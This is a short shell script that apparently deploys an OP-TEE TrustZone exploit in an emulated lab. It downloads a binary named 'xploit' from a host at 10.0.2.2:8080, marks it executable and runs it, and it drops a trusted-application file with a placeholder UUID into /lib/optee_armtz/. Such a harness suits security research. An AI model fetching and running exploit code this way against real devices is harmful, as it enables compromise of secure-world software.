#!/bin/sh

set -e

A=${A:-"10.0.2.2:8080"}

wget -P / http://${A}/xploit/host/xploit
chmod u+x /xploit
wget -P /lib/optee_armtz/ http://${A}/xploit/ta/41414141-4141-4141-4141-414141414141.ta
/xploit
